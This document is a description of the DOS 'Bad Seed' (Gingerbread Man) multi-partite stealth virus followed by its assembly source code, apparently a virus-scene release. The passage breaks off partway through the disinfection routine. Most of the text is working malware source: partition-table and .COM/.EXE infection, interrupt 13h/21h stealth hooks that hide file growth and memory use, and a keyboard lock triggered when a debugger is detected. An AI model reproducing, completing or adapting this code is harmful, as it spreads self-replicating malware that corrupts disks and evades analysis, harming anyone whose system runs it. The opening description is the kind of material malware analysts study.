                             Credits as follows:
                     Documentation written by: Prototype

Virus Name:  Bad Seed
Aliases:     Gingerbread Man 1
V Status:    Common 
Discovery:   February, 1993
Symptoms:    .COM, .EXE, and overlay, growth, partition table altered
Origin:      Australia
Eff Length:  2,774 bytes
Type Code:   PRatAX - Parasitic Resident .COM, .EXE, overlay, and
                      partition table infector
Detection Method:
Removal Instructions:  Delete infected files and replace partition table

General Comments:
      The  Bad Seed virus was isolated in February, 1993.  Its origin is
      Australia.  It  is  a memory resident multi-partite  virus,  which
      infects  the  hard  disk  partition table,  and  .COM,  .EXE,  and
      overlay,  files,  except the file to which COMSPEC points.  It  is
      also  an advanced unencrypted full-stealth virus, in that it hides
      the  increase  in  file length and the decrease  in  total  system
      memory,  and  disinfects  files,  the  partition  table,  and  the
      interrupt table, while the virus is memory resident.

      The first time that a file infected with the  Bad  Seed  virus  is
      executed,  the virus will install a portion of itself in an "hole"
      in  low  allocated system memory at 0000:0600h.  There will be  no
      change in the value of total system or free memory, as reported by
      CHKDSK  or MEM.  Interrupt 13h and 21h will be directly hooked  by
      the  virus in the interrupt vector table in memory.  Programs that
      monitor  the  use  of interrupt 13h will be unable to  detect  the
      virus  active  in memory.  The hard disk partition table  will  be
      infected  with  the Bad Seed virus at this time, by  altering  two
      bytes.  The  virus will then write a copy of itself to the sectors
      local  to  the partition table, beginning at sector 2.  The  virus
      will  not  yet infect files, however.

      While the virus is memory resident, attempts to read the partition
      table  will result in a "clean" copy of the partition table  being
      returned.  Attempts  to  read the sectors local to  the  partition
      table,  on  which the virus resides, will result in blank  sectors
      being returned.

      Attempts  to write to the partition table will be permitted by the
      virus, but the virus will reinfect the table during the operation.
      Attempts  to write to the sectors on which the virus resides  will
      be disallowed by the virus.

      If  a  program requests the address of interrupt 13h or  21h,  the
      original  interrupt  address will be returned by the virus.  If  a
      program  attempts to set the address of interrupt 13h or 21h,  the
      virus will permit the change but will retain control.

      When  an  infected system is booted from the hard disk, the  virus
      will  install  itself  resident at the top of system  memory,  but
      below  the 640k boundary.  Total system memory and available  free
      memory  will  be  reduced by 3,072 bytes.  The value  returned  by
      interrupt  12h  will  be reduced, but this value  is  restored  in
      memory when either CHKDSK or MEM is executed.  However, the change
      in  free memory is always visible.  Interrupt 13h and 21h will  be
      directly  hooked  by  the virus in the interrupt vector  table  in
      memory.  Programs  that monitor the use of interrupt 13h be unable
      to  detect  the virus active in memory.

      When  a file is executed, or a .COM, or .EXE, file, is opened  for
      any  reason, the virus will attach itself to the end of the  file,
      increasing  the file size by 2,774 bytes.  In the case of the COPY
      or XCOPY command, the virus will infect both the source and target
      file.  The virus will hide the file length increase, however.

      If  a  write operation is performed on an infected file, the  file
      will  be  physically  disinfected  until the  termination  of  the
      operation, at which time the file will be reinfected.  Unlike most
      other  viri, the virus will not infect files that contain internal
      overlays.  The virus will also not infect files during a Microsoft
      Windows session.

      Attempts  to  read an infected file will result in a "clean"  copy
      being  returned, as the virus disinfects files  "on-the-fly".  The
      virus  identifies  infected  files by setting the seconds  in  the
      file's  time stamp to 60, but attempts to retrieve the file's date
      and  time stamp will result in the seconds field being set to  00.

      CHKDSK  will not report file allocation errors on infected  files,
      regardless  of  whether or not the virus is memory  resident.  The
      virus will also lock the keyboard if it determines that a debugger
      is in use.

      The following text strings can be found within the viral code:

              "You can't catch the Gingerbread Man!!"
              "Bad Seed - Made in OZ"
              "COMSPEC="
              "CHKDSK"
              "MEM"
              "10/23/92"



;                             Credits as follows:
;                   Virus source code written by:  Prototype


code_byte_c     equ offset lastb-begin
stack_c         equ 50h
int_count       equ 14h
disinfect_c     equ 26h
scratch_c       equ 200h
total_byte_c    equ code_byte_c+stack_c+int_count+scratch_c
com_byte_c      equ 0ffffh-total_byte_c
sec_count       equ (code_byte_c+1ffh)/200h
read_sec        equ code_byte_c/200h+200h
write_sec       equ sec_count+300h
pgrph_count     equ (total_byte_c+0fh)/10h
kilo_count      equ (code_byte_c+int_count+disinfect_c)/400h+1
kilo_byte       equ kilo_count*400h
extra_count     equ pgrph_count/10h+0fh
ptshn_byte_c    equ offset dis_part_end-dis_part_start
ptshn_para_c    equ (offset ptshn_byte_c+int_count+0fh)/10h

.model  tiny
.code

org     100h

begin:  call    fileload

partload:                               ;partition-loaded code begins here
        mov     word ptr ds:[7dfeh],0

chksum: dw      2e83h
        dw      413h
        db      kilo_count
        int     12h                     ;allocate memory at top of system memory
        mov     cl,6
        shl     ax,cl
        mov     es,ax                   ;get segment of new top of system memory
        mov     ax,read_sec
        mov     bx,203h
        mov     cx,3
        int     13h                     ;read viral code sectors to top of system memory
        mov     al,0e8h
        xor     di,di
        cld
        stosb
        mov     ax,offset fileload-partload
        stosw                           ;store initial call into code
        mov     cx,100h
        mov     si,7c00h
        repz    movsw                   ;move code to top of system memory
        mov     es:[offset far_13_1-begin],offset cur13_addr-begin
        mov     es:[offset far_13_2-begin],offset old13_addr-begin
                                        ;relocate far calls for partition load
        mov     byte ptr es:[offset from_part-begin],0
        mov     byte ptr es:[offset scratch_area-begin+25h],0
                                        ;ensure previously opened files are not accidently infected
        mov     si,offset hook_interrupts-begin
        push    es
        push    si
        mov     ax,offset new_21h_1-begin
        mov     si,3
        mov     di,offset old21_addr-begin
        retf

run_buffer:
        db      8 dup (0)
        db      "You can't catch the Gingerbread Man!!"

fileload:                               ;file-loaded code begins here
        xchg    bp,ax                   ;save initial value
        pop     si                      ;point to start of viral code
        push    es
        push    ds
        push    cs
        pop     ds
        mov     ax,0eee7h
        int     21h                     ;check if resident
        cmp     ax,0d703h
        jz      jump_end                ;already resident
        mov     es,es:[2ch]             ;get environment segment
        cld
        xor     di,di

find_spec:
        push    si
        add     si,offset spec-partload
        mov     cx,8
        repz    cmpsb                   ;find COMSPEC=
        pushf
        call    find_zero
        popf
        jz      found_spec
        pop     si
        jnz     find_spec               ;repeat until COMSPEC= is found

jump_end:        
        jmp     file_end
        db      "Bad Seed - Made in OZ" ;patriotism at its best!

found_spec:
        push    ds
        push    es
        pop     ds
        pop     es
        xchg    si,di
        std
        lodsw                           ;point to last character in COMSPEC file
        mov     cx,si
        dec     cx
        add     di,0ch                  ;point to viral buffer for COMSPEC file

move_comspec:
        lodsb
        stosb                           ;move COMSPEC file into code
        cmp     al,5ch                  ;until '\' is found
        jnz     move_comspec
        sub     cx,si                   ;calculate length of filename
        pop     si
        push    cs
        pop     ds                      ;save length of COMSPEC file
        mov     [si+offset spec_length-partload],cl
        mov     byte ptr [si+offset from_part-partload],1
        xor     ax,ax
        mov     es,ax
        push    si
        add     si,offset dis_part_start-partload
        mov     di,600h
        mov     cx,ptshn_byte_c
        cld
        repz    movsb                   ;install code in hole in low system memory
        pop     si
        mov     ds,cx
        mov     ds:[offset far_13_1-dis_part_start+600h],offset cur13_addr-dis_part_start+600h
        mov     ds:[offset far_13_2-dis_part_start+600h],offset old13_addr-dis_part_start+600h
                                        ;relocate far calls for file load
        mov     ax,600h

hook_interrupts:
        cli
        cmp     byte ptr cs:[si+offset from_part-partload],0
        jnz     file_hook21h
        mov     ax,offset new_8-begin
        xchg    ax,ds:[20h]
        stosw
        mov     ax,cs
        xchg    ax,ds:[22h]
        stosw                           ;hook interrupt 8
        mov     ds:[86h],0ffffh         ;fuck interrupt 21h until further notice
        sti
        add     di,8
        jmp     short part_hook13h

file_hook21h:
        xchg    ax,ds:[84h]
        stosw
        xchg    bx,ax
        mov     ax,es
        xchg    ax,ds:[86h]
        stosw                           ;hook interrupt 21h
        xchg    bx,ax
        stosw
        xchg    bx,ax
        stosw

hook_1: lea     ax,[si+offset new_1-partload]
        xchg    ax,ds:[4]
        stosw
        mov     ax,cs
        xchg    ax,ds:[6]
        stosw                           ;hook interrupt 1
        sti

part_hook13h:
        clc
        push    es

store_13h:
        push    ds
        lds     bx,ds:[4ch]
        mov     ax,bx
        stosw
        mov     ax,ds
        stosw                           ;save interrupt 13h handler address
        jb      infect_part
        push    ds
        pop     es
        pushf
        push    cs
        call    call_13h
        pop     ds
        pop     es
        stc
        jb      store_13h

infect_part:
        pop     ds
        push    si
        cmp     byte ptr cs:[si+offset from_part-partload],0
        pushf
        mov     si,offset new_13h-dis_part_start+600h
        jnz     file_res
        mov     si,offset new_13h-begin ;use appropriate beginning address

file_res:
        cli
        mov     ds:[4ch],si
        mov     ds:[4eh],es             ;hook interrupt 13h
        sti
        popf
        pop     si
        push    cs
        pop     ds
        jz      go_boot
        push    es
        push    cs
        pop     es
        mov     ax,201h
        lea     bx,[si+offset scratch_area-partload]
        mov     cx,1
        mov     dx,80h
        int     3                       ;read partition table
        pop     es
        jnb     locate_active
        jmp     short save_checksum

locate_active:
        mov     cx,4
        mov     di,1beh

find_hd:
        test    byte ptr [bx+di],80h    ;look for C: partition beginning
        jnz     found_hd
        add     di,10h
        loop    find_hd                 ;fall through if partition is invalid

file_end:
        pop     ds
        mov     dx,ds
        pop     es
        cmp     cs:[si+offset exe_buffer-partload],"ZM"
        jz      exec_exe                ;test if host file is .EXE
        add     si,offset exe_buffer-partload
        mov     di,100h
        push    cs
        push    di
        movsb
        movsw                           ;restore original 3 bytes of .COM file
        xor     ax,ax
        xor     bx,bx
        xor     cx,cx
        xor     dx,dx
        xor     si,si
        xor     di,di
        xchg    bp,ax
        retf

go_boot:
        xor     cx,cx
        mov     es,cx
        mov     ax,201h
        mov     bx,7c00h
        mov     cx,1
        mov     dx,180h
        int     13h                     ;load boot sector
        push    es
        push    bx
        retf                            ;proceed with boot

exec_exe:
        add     dx,10h                  ;restore host .EXE file header
        add     cs:[si+offset run_buffer-partload+6],dx
        add     dx,cs:[si+offset run_buffer-partload+2]
        mov     ss,dx
        mov     sp,cs:[si+offset run_buffer-partload]
        xchg    bp,ax
        dw      0ff2eh
        db      6ch                     ;jmp far cs:[run_buffer+4]
        db      offset run_buffer-partload+4

found_hd:
        inc     di                      ;save offset of C: partition beginning
        mov     es:[offset head_off-dis_part_start+600h],di
        mov     [si+offset head_off-partload],di
        mov     ax,200h
        cmp     [bx+di],ax              ;check if already infected
        jz      file_end
        mov     [bx+di],ax              ;point to viral code
        push    cs
        pop     ds
        clc

save_checksum:
        mov     ax,0aa55h
        xchg    [si+1feh],ax            ;save checksum in code
        push    ax                      ;(reduce partition changes to 2 bytes)
        jb      restore_13h
        mov     [si+offset chksum-partload-2],ax
        push    cs
        pop     es
        mov     ax,301h
        mov     cx,1
        mov     dx,80h
        int     3                       ;write infected partition table
        jb      restore_13h
        mov     ax,write_sec
        mov     bx,si
        mov     cx,2
        int     3                       ;write viral code

restore_13h:
        mov     ax,0                    ;zero ax without disturbing flags
        mov     es,ax
        mov     ds,ax
        push    si
        cld
        cli
        jnb     restore_3
        mov     si,offset cur13_addr-dis_part_start+600h
        mov     di,4ch
        movsw
        movsw                           ;restore old interrupt 13h handler

restore_3:
        pop     si
        push    si
        push    cs
        pop     ds
        add     si,offset store_3-partload-4
        mov     di,0ch
        movsw
        movsw                           ;restore old interrupt 3 handler
        sti
        pop     si
        
table_fail:
        pop     [si+1feh]               ;restore overwritten word in code
        jmp     file_end
        
call_13h:
        pushf
        cmp     byte ptr cs:[si+offset from_part-partload],0
        jz      clear_t_flag
        popf
        mov     ax,300h                 
        push    ax                      ;equivalent to pushf (but with T flag set)

clear_t_flag:
        push    es
        push    bx
        mov     ah,1                    ;get system status using interrupt 13h
        mov     dl,80h

new_1:  cli
        push    bp
        mov     bp,sp
        push    bx
        push    ax
        mov     bx,cs
        mov     ax,[bp+4]               ;retrieve CS from interrupt call
        cmp     ax,70h                  ;check if CS=BIOS segment
        ja      quit_1
        push    ds
        push    es
        xor     bx,bx
        mov     ds,bx
        mov     ds:[4eh],ax
        mov     bx,[bp+2]
        mov     ds:[4ch],bx             ;hook interrupt 13h with BIOS address
        push    di
        call    store_3
        dd      0

store_3:
        pop     di
        push    cs
        pop     es
        cld
        xchg    bx,ax
        xchg    ds:[0ch],ax
        stosw
        xchg    bx,ax
        xchg    ds:[0eh],ax             ;hook interrupt 3
        stosw
        push    ds
        pop     es
        push    si
        mov     si,offset old01_addr-dis_part_start+600h
        mov     di,4
        movsw
        movsw                           ;restore old interrupt 1 handler
        pop     si
        pop     di
        pop     es
        pop     ds

quit_1: pop     ax
        pop     bx
        pop     bp
        sti
        iret

spec:   db      "COMSPEC="
        db      0dh dup (0)

spec_length:
        dw      0

new_8:  push    ds
        push    ax
        xor     ax,ax
        mov     ds,ax
        cmp     ds:[86h],1000h          ;get current interrupt 21h segment
        ja      exit_8
        push    es
        push    si
        push    di
        push    cs
        pop     es
        mov     ax,cs
        mov     di,offset cur21_addr-begin+2
        std
        cli
        xchg    ax,ds:[86h]
        stosw
        mov     ax,offset new_21h_1-begin
        xchg    ax,ds:[84h]
        stosw                           ;hook interrupt 21h
        push    ds
        push    es
        pop     ds
        pop     es
        mov     si,di
        mov     di,22h
        movsw
        movsw                           ;restore old interrupt 8 handler
        sti
        pop     di
        pop     si
        pop     es

exit_8: pop     ax
        pop     ds
        db      2eh
        dw      2effh
        dw      offset old21_addr-begin ;jmp far cs:[old21h] (current int 8)

new_21h_1:                              ;file-infect interrupt 21h starts here
        push    ds
        push    ax
        xor     ax,ax
        mov     ds,ax
        mov     ax,ds:[4]
        cmp     ax,ds:[0ch]
        jnz     lock_keyboard
        mov     ax,ds:[6]
        cmp     ax,ds:[0eh]             ;determine if a debugger is in use
        jz      cmp_11

lock_keyboard:
        mov     al,82h
        out     21h,al                  ;lock keyboard (that'll fuck 'em!)

cmp_11: pop     ax
        pop     ds
        cmp     ah,11h                  ;find first (used by DIR)
        jz      hide_length
        cmp     ah,12h                  ;find next (used by DIR)
        jnz     cmp_3c

hide_length:
        call    call_21h
        test    al,al                   ;check for error
        jnz     qthide
        push    es
        push    ax
        push    bx
        mov     ah,51h
        call    call_21h                ;get PSP segment
        mov     es,bx
        cmp     bx,es:[16h]
        jnz     nohide
        mov     bx,dx
        mov     al,[bx]
        push    ax
        mov     ah,2fh
        call    call_21h                ;get DTA address
        pop     ax
        inc     al
        jnz     notime
        add     bx,7

notime: mov     ax,es:[bx+17h]          ;get time
        and     ax,1fh
        xor     al,1eh                  ;check for 62 seconds
        jnz     nohide
        and     byte ptr es:[bx+17h],0e0h
        or      byte ptr es:[bx+17h],1  ;prevent 12:00am times disappearing
        sub     word ptr es:[bx+1dh],code_byte_c
        sbb     es:[bx+1fh],ax          ;hide length increase and 62 seconds

nohide: pop     bx
        pop     ax
        pop     es

qthide: iret

cmp_3c: cmp     ah,3ch                  ;create
        jz      check_extend
        cmp     ah,3dh                  ;open
        jz      check_infect
        cmp     ah,3eh                  ;close
        jnz     cmp_3f
        jmp     check_close

cmp_3f: cmp     ah,3fh                  ;read
        jz      go_disinf
        cmp     ah,40h                  ;write
        jz      go_disinf
        cmp     ah,42h                  ;set file pointer
        jnz     cmp_4b
        cmp     al,2
        jb      no_inf

go_disinf:
        jmp     check_disinf

cmp_4b: cmp     ah,4bh                  ;execute
        jnz     cmp_4c
        cmp     al,2
        jb      go_infect
        jmp     short no_inf

check_infect:
        cmp     byte ptr cs:[offset windows_active-begin],1
        jz      no_inf
        cmp     ax,3d01h
        jnz     go_infect
        inc     al

go_infect:
        call    check_comspec

no_inf: jmp     do_21h

cmp_4c: cmp     ah,4ch                  ;terminate program
        jnz     cmp_57
        jmp     check_psp

cmp_57: cmp     ah,57h                  ;get/set file date and time
        jnz     cmp_5b
        jmp     fix_time

cmp_5b: cmp     ah,5bh                  ;create
        jz      check_extend
        cmp     ax,6c00h                ;extended open
        jnz     cmp_eee7

check_extend:
        cmp     byte ptr cs:[offset windows_active-begin],1
        jz      no_inf                  ;exit if Windows is executing
        push    bx
        push    dx
        cmp     ax,6c00h
        jnz     check_create
        or      bl,2
        and     bl,0feh                 ;enable read and write mode for extended open
        mov     dx,si
        call    check_comspec

check_create:
        push    bx
        push    es
        push    ax
        push    cx
        push    si
        push    di
        push    ds
        pop     es
        call    set_di
        std
        mov     si,di
        lodsb
        lodsw
        call    get_suffix              ;check if .COM or .EXE
        mov     cs:[offset scratch_area-begin+24h],cl
        jnz     create_file
        inc     cx
        mov     cs:[offset scratch_area-begin+24h],cl
                                        ;save executable status

create_file:
        pop     di
        pop     si
        pop     cx
        pop     ax
        pop     es
        pop     bx
        pop     dx
        push    ax
        call    call_21h                ;create file
        jb      bad_create
        inc     sp
        inc     sp
        xchg    bx,ax
        push    cx
        push    dx
        mov     ax,5700h
        call    call_21h                ;get file date and time
        call    check_seconds           ;check if file is already infected
        pop     dx
        pop     cx
        xchg    bx,ax
        jnz     save_handle
        mov     cs:[offset scratch_area-begin+24h],al
                                        ;specify file is not to be infected

save_handle:
        mov     cs:[offset scratch_area-begin+25h],al
                                        ;save handle
        pop     bx
        jmp     set_flags

bad_create:
        mov     byte ptr cs:[offset scratch_area-begin+24h],0
        pop     ax
        pop     bx
        jmp     do_21h

cmp_eee7:
        cmp     ax,0eee7h               ;check if resident
        jz      return_gm
        jmp     do_21h

return_gm:
        mov     ah,0d7h

new_24h:                                ;new interrupt 24h handler
        mov     al,3                    ;abort
        iret

set_di: mov     di,dx

find_zero:
        xor     al,al
        mov     cl,80h
        cld
        repnz   scasb                   ;find following zero
        ret

check_comspec:
        push    es
        push    bx
        push    cx
        push    si
        push    di
        push    ds
        push    dx
        push    ds
        pop     es
        push    ax
        call    set_di
        dec     di
        dec     di
        push    cs
        pop     ds
        mov     cx,ds:[offset spec_length-begin]
        mov     si,offset spec_length-begin-1
        std
        push    di

load_comspec:
        lodsb
        mov     ah,al
        xchg    si,di
        db      26h
        lodsb
        xchg    si,di
        and     ax,5f5fh                ;convert it to uppercase
        cmp     ah,al                   ;check for COMSPEC file
        jnz     not_comspec
        loop    load_comspec
        pop     di
        jmp     no_ispec

get_suffix:
        mov     cx,2

get_type:
        db      26h
        lodsw                           ;get file's suffix
        and     ax,5f5fh                ;convert it to uppercase
        xchg    bx,ax
        loop    get_type
        cmp     ax,4d4fh                ;MO
        jnz     maybe_exe
        cmp     bx,430eh                ;C.
        ret

maybe_exe:
        cmp     ax,4558h                ;EX
        jnz     return_suffix
        cmp     bx,450eh                ;E.

return_suffix:
        ret

not_comspec:
        pop     si
        dec     si
        pop     ax
        push    ax
        cmp     ax,4b00h
        pushf
        call    get_suffix              ;check if .COM or .EXE
        jz      check_exec
        popf
        jz      restore_memory

jmp_noset:
        jmp     no_ispec
        db      "CHKDSK"

windows_active:
        db      0

check_mem:
        db      "MEM"

check_exec:
        popf
        jnz     hook_24h                ;check if file is being executed

restore_memory:
        inc     si
        mov     di,si
        inc     si
        mov     cx,si
        sub     cx,dx
        xchg    si,di

check_slash:
        db      26h
        lodsb
        cmp     al,5ch
        jz      found_slash
        loop    check_slash             ;locate back slash (if any)
        jnz     no_slash

found_slash:
        inc     si
        inc     si
        mov     dx,si                   ;set beginning address without path

no_slash:
        mov     cx,di
        sub     cx,dx                   ;get length of filename without suffix
        dec     di
        mov     si,offset check_mem-begin+2
        cmp     cx,3                    ;perhaps MEM or WIN
        jz      hook_12h
        lodsw
        lodsw
        cmp     cx,6                    ;perhaps CHKDSK
        jnz     hook_24h

hook_12h:
        lodsb
        mov     ah,al
        xchg    si,di
        db      26h
        lodsb                           ;es:lodsb
        and     ax,5f5fh
        cmp     ah,al
        jnz     check_win
        xchg    si,di
        loop    hook_12h                ;check if MEM or CHKDSK is being run
        mov     ax,offset new_12h-begin
        mov     di,offset old01_addr-begin
        mov     ds,cx
        push    cs
        pop     es
        cld
        cli
        xchg    ax,ds:[48h]
        stosw
        mov     ax,cs
        xchg    ax,ds:[4ah]
        stosw                           ;hook interrupt 12h (hide memory change)
        sti
        jmp     short hook_24h

check_win:
        cmp     cx,3
        jnz     hook_24h
        cmp     al,4eh
        jnz     hook_24h
        dec     si
        db      26h
        lodsw
        and     ax,5f5fh
        cmp     ax,4957h                ;check if WIN is being executed
        jnz     hook_24h
        mov     byte ptr ds:[offset windows_active-begin],1

hook_24h:
        cmp     byte ptr cs:[offset windows_active-begin],1
        jz      no_ispec
        cli
        xor     cx,cx
        mov     ds,cx
        les     bx,ds:[90h]
        push    es
        push    bx
        mov     ds:[90h],offset new_24h-begin
        mov     ds:[92h],cs             ;hook interrupt 24h
        sti
        push    ds
        push    bp
        mov     bp,sp
        lds     dx,[bp+0ah]             ;get original DS:DX
        pop     bp
        push    ds
        push    dx
        mov     ax,4300h
        call    call_21h                ;get file attributes
        push    cx
        jb      bad_op
        test    cl,1                    ;check for read-only attribute set
        jz      not_ro
        dec     cx
        mov     ax,4301h
        call    call_21h                ;set file attributes as read/write

not_ro: mov     ax,3d02h
        call    call_21h                ;open file for read/write
        jb      bad_op
        xchg    bx,ax
        mov     ax,5700h
        call    call_21h                ;get file date and time
        jb      bad_rd
        call    check_seconds
        jz      bad_rd
        push    cx
        push    dx
        call    infect
        pop     dx
        pop     cx
        jb      bad_rd
        mov     ax,5701h
        call    call_21h                ;restore file date and time

bad_rd: mov     ah,3eh
        call    call_21h                ;close file

bad_op: pop     cx
        pop     dx
        pop     ds
        jb      no_set
        test    cl,1                    ;check for read-only attribute set
        jz      no_set
        mov     ax,4301h
        call    call_21h                ;restore file attributes

no_set: pop     ds
        pop     bx
        pop     ax
        mov     ds:[90h],bx
        mov     ds:[92h],ax             ;restore old interrupt 24h handler

no_ispec:
        pop     ax
        pop     dx
        pop     ds
        pop     di
        pop     si
        pop     cx
        pop     bx
        pop     es
        ret

infect: push    cs
        pop     ds
        mov     dx,offset scratch_area-begin
        mov     cx,18h
        mov     ah,3fh
        call    call_21h                ;read .EXE header
        sub     cx,ax
        jnz     notexe
        push    ds
        pop     es
        xchg    cx,ax
        mov     si,dx
        mov     di,offset exe_buffer-begin
        cld
        repz    movsb                   ;save copy of header for disinfection
        mov     di,dx
        mov     si,offset run_buffer-begin
        les     ax,[di+0eh]
        mov     [si],es
        mov     [si+2],ax
        les     ax,[di+14h]
        mov     [si+4],ax
        mov     [si+6],es
        mov     ds:[offset scratch_area-begin+1dh],cl
        mov     ax,"MZ"
        cmp     ax,[di]
        xchg    ah,al
        jnz     check_zm
        mov     [di],ax

check_zm:
        cmp     ax,[di]
        jz      find_eof                ;ensure header contains MZ or ZM
        inc     byte ptr ds:[offset scratch_area-begin+1dh]

find_eof:
        mov     ax,4202h
        mov     dx,cx
        call    call_21h                ;set file pointer to end of file
        jb      badexe
        mov     [di+18h],ax
        mov     [di+1ah],dx
        cmp     byte ptr ds:[offset scratch_area-begin+1dh],0
        jz      overlay_check
        cmp     ax,com_byte_c+1         ;check .COM file + virus is less than 64k
        jb      ok_com

notexe: stc

badexe: ret

overlay_check:
        push    di
        mov     cx,9
        mov     si,[di+4]
        dec     si
        xor     di,di

calc_size:
        shl     si,1
        rcl     di,1
        loop    calc_size               ;calculate file size from header info
        cmp     dx,di
        pop     di
        jnz     notexe
        add     si,[di+2]
        cmp     si,[di+18h]             ;don't want to infect .EXE files
        jnz     notexe                  ;that contain internal overlays
        cmp     ax,code_byte_c
        sbb     dx,0
        jb      badexe                  ;ensure host file is longer than virus
        xor     dx,dx
        cmp     dx,[di+0ch]
        jz      notexe
        
ok_com: mov     cx,code_byte_c
        mov     ah,40h
        call    call_21h                ;write viral code
        jb      badexe
        sub     cx,ax
        jnz     notexe
        mov     dx,cx
        mov     ax,4200h
        call    call_21h                ;set file pointer to start of file
        jb      badexe
        mov     ax,[di+18h]
        cmp     byte ptr ds:[offset scratch_area-begin+1dh],1
        jz      save_jump
        mov     dx,[di+1ah]
        mov     cx,4
        push    di
        mov     si,[di+8]
        xor     di,di

dohead: shl     si,1
        rcl     di,1
        loop    dohead                  ;calculate new header size
        sub     ax,si
        sbb     dx,di
        pop     di
        mov     cl,0ch
        shl     dx,cl
        mov     [di+14h],ax
        mov     [di+16h],dx
        add     dx,pgrph_count          ;amount of additional memory to allocate
        mov     [di+10h],ax
        mov     [di+0eh],dx
        dw      4583h
        db      0ah
        db      extra_count
        mov     ax,[di+0ah]
        cmp     ax,[di+0ch]
        jb      no_max
        mov     [di+0ch],ax

no_max: mov     ax,[di+2]
        add     ax,code_byte_c
        push    ax
        and     ah,1
        mov     [di+2],ax               ;save additional paragraphs to allocate
        pop     ax
        mov     cl,9
        shr     ax,cl
        add     [di+4],ax
        mov     dx,offset scratch_area-begin
        mov     cx,18h
        jmp     short write_header

save_jump:
        mov     dx,offset scratch_area-begin
        mov     di,dx
        mov     byte ptr [di],0e9h
        inc     di
        sub     ax,3
        push    ds
        pop     es
        cld
        stosw                           ;store jump to viral code in .COM file
        mov     cx,3

write_header:
        mov     ah,40h
        call    call_21h                ;write new .EXE header
        jb      badwrt
        cmp     ax,cx
        jz      ok_wrt

badwrt: stc

ok_wrt: ret

check_close:
        cmp     cs:[offset scratch_area-begin+25h],bl
        jnz     close_file              ;check if saved handle is terminating
        cmp     byte ptr cs:[offset scratch_area-begin+24h],1
        jnz     close_file              ;check if handle is executable
        dec     byte ptr cs:[offset scratch_area-begin+24h]
        push    ds
        push    es
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        mov     ax,4200h
        xor     cx,cx
        xor     dx,dx
        call    call_21h
        call    infect                  ;infect file
        jb      ok_close
        mov     ax,5700h
        call    call_21h
        inc     al
        or      cl,1fh
        dec     cx
        mov     ax,5701h
        call    call_21h                ;set 62 seconds

ok_close:
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        pop     es
        pop     ds

close_file:
        call    call_21h
        jmp     set_flags

check_disinf:
        push    es
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        mov     ax,5700h
        call    call_21h                ;get file date and time
        or      al,al
        jb      dis_error
        call    check_seconds

dis_error:
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        pop     es
        jz      disinfect

no_dis: jmp     do_21h

check_seconds:
        mov     al,cl
        or      cl,1fh
        dec     cx
        xor     al,cl                   ;check for 62 seconds
        ret

disinfect:
        push    ds
        push    dx
        push    cx
        push    ax
        push    cs
        pop     ds
        mov     ds:[offset scratch_area-begin+18h],cx
        xor     cx,cx
        mov     ds:[offset scratch_area-begin+1ah],cx
        mov     ax,4201h
        xor     dx,dx
        call    call_21h                ;calculate current file pointer position
        mov     ds:[offset scratch_area-begin+1ch],ax
        mov     ds:[offset scratch_area-begin+1eh],dx
        mov     ax,4202h
        xor     dx,dx
        call    call_21h
        sub     ax,code_byte_c
        sbb     dx,0                    ;calculate original end of file
        mov     ds:[offset scratch_area-begin+20h],ax
        mov     ds:[offset scratch_area-begin+22h],dx
        pop     ax
        cmp     ah,42h
        jnz     read_or_write
        pop     cx
        pop     dx
        pop     ds
        push    cx
        sub     dx,code_byte_c
        sbb     cx,0
        call    call_21h                ;proceed with set file pointer
        pop     cx
        jmp     set_flags

go_restore:
        jmp     restore_file

read_or_write:
        push    ax
        mov     ax,4200h
        mov     dx,ds:[offset scratch_area-begin+1ch]
        mov     cx,ds:[offset scratch_area-begin+1eh]
        call    call_21h                ;restore current file pointer position
        or      dx,dx
        jnz     main_file
        cmp     ax,17h

main_file:
        ja      not_header              ;test if operation involves any header area
        pop     ax
        pop     cx
        push    cx
        push    ax
        cmp     ah,3fh
        jnz     go_restore

read_file:
        mov     ax,cx
        add     cx,ds:[offset scratch_area-begin+1ch]
        jb      header_plus             ;test if read requires bytes outside header
        cmp     cx,18h
        jb      read_header

header_plus:
        mov     ax,18h
        sub     ax,ds:[offset scratch_area-begin+1ch]
                                        ;calculate number of bytes of header to read
        mov     ds:[offset scratch_area-begin+1ah],ax

read_header:
        sub     ds:[offset scratch_area-begin+18h],ax
        push    ax
        mov     ax,4200h
        mov     cx,ds:[offset scratch_area-begin+22h]
        mov     dx,ds:[offset scratch_area-begin+20h]
        add     dx,offset exe_buffer-begin
        adc     cx,0
        call    call_21h                ;set file pointer to original header
        pop     cx
        push    bp
        mov     bp,sp
        lds     dx,[bp+6]
        pop     bp
        mov     ah,3fh
        call    call_21h                ;read original header into destination area
        push    cs
        pop     ds
        push    ax
        push    cx
        add     ds:[offset scratch_area-begin+1ch],ax
        adc     ds:[offset scratch_area-begin+1eh],0
        mov     dx,ds:[offset scratch_area-begin+1ch]
        mov     cx,ds:[offset scratch_area-begin+1eh]
        mov     ax,4200h
        call    call_21h                ;set file pointer to current position plus bytes read
        pop     cx
        pop     ax
        sub     cx,ax
        jnz     read_error
        cmp     ds:[offset scratch_area-begin+18h],0
        jnz     not_header
        pop     cx
        pop     cx
        mov     ax,cx
        jz      dis_return

read_error:
        pop     dx
        pop     dx

dis_return:
        pop     dx
        pop     ds
        jmp     set_flags

not_header:
        pop     ax
        push    ax
        mov     cx,ds:[offset scratch_area-begin+1ch]
        mov     dx,ds:[offset scratch_area-begin+1eh]
        cmp     dx,ds:[offset scratch_area-begin+22h]
        jb      not_eof
        cmp     cx,ds:[offset scratch_area-begin+20h]
        jbe     not_eof                 ;test if current file pointer is within original file size
        cmp     ah,40h
        jz      restore_file
        pop     ax
        pop     cx
        xor     ax,ax
        jz      dis_return              ;return zero bytes read if file size already exceeded

not_eof:
        add     cx,ds:[offset scratch_area-begin+18h]
        adc     dx,0
        cmp     dx,ds:[offset scratch_area-begin+22h]
        jb      within_file
        cmp     cx,ds:[offset scratch_area-begin+20h]
        jbe     within_file             ;test if operation is within original file size
        cmp     ah,40h
        jz      restore_file
        mov     cx,ds:[offset scratch_area-begin+20h]
        mov     dx,ds:[offset scratch_area-begin+22h]
        sub     cx,ds:[offset scratch_area-begin+1ch]
        sbb     dx,ds:[offset scratch_area-begin+1eh]
                                        ;calculate number of bytes to read
        or      dx,dx
        jz      save_count
        mov     cx,0ffffh               ;if greater than page size, set read to 64k
        sub     cx,ds:[offset scratch_area-begin+1ah]
